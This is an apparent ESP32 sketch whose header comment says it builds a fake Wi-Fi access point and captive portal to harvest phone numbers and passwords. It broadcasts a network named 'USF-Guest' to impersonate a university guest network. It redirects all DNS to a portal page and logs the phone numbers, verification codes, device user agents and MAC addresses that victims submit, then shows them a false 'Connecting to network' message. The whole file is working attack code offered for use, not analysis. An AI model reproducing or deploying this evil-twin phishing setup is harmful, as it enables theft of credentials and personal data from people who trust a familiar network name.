/*Nandhu Shankar
#This code sets up a fake wifi instance and capture portal to harvest phone numbers and passwords
#Mostly uses prebuilt functions in wifi.h */

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include "portal.h"
#include "code.h"

const char* SSID = "USF-Guest"; #change this for wifi name
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer webServer(80);
int lastClientCount = 0;

void handlePortal() {
  Serial.printf("{\"event\":\"http_request\",\"url\":\"%s\",\"method\":\"%s\"}\n",
    webServer.uri().c_str(),
    webServer.method() == HTTP_GET ? "GET" : "POST");
  webServer.send(200, "text/html", portalHTML);
}

void handleRegister() {
  String phone = webServer.arg("phone");
  String userAgent = webServer.header("User-Agent");
  Serial.printf("{\"event\":\"phone_submit\",\"phone\":\"%s\",\"device\":\"%s\"}\n",
    phone.c_str(), userAgent.c_str());
  webServer.send(200, "text/html", codeHTML);
}

void handleVerify() {
  String code = webServer.arg("code");
  Serial.printf("{\"event\":\"code_submit\",\"code\":\"%s\"}\n", code.c_str());
  webServer.send(200, "text/html", "<h3 style='font-family:Arial;color:#006747;text-align:center;margin-top:40px'>Connecting to network, please wait...</h3>");
}

void setup() {
  Serial.begin(115200);
  WiFi.softAP(SSID);

  Serial.print("{\"event\":\"ap_started\",\"ip\":\"");
  Serial.print(WiFi.softAPIP());
  Serial.println("\"}");

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  webServer.on("/", handlePortal);
  webServer.on("/register", HTTP_POST, handleRegister);
  webServer.on("/verify", HTTP_POST, handleVerify);
  webServer.onNotFound(handlePortal);
  webServer.begin();

  Serial.println("{\"event\":\"boot\",\"ssid\":\"USF-Guest\"}");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  int currentCount = WiFi.softAPgetStationNum();
  if (currentCount != lastClientCount) {
    if (currentCount < lastClientCount) {
      Serial.printf("{\"event\":\"disconnection\",\"clients_remaining\":%d}\n", currentCount);
    }
    if (currentCount > 0) {
      wifi_sta_list_t stationList;
      esp_wifi_ap_get_sta_list(&stationList);
      for (int i = 0; i < stationList.num; i++) {
        uint8_t* mac = stationList.sta[i].mac;
        Serial.printf("{\"event\":\"connection\",\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"rssi\":%d}\n",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
          stationList.sta[i].rssi);
      }
    }
    lastClientCount = currentCount;
  }
}
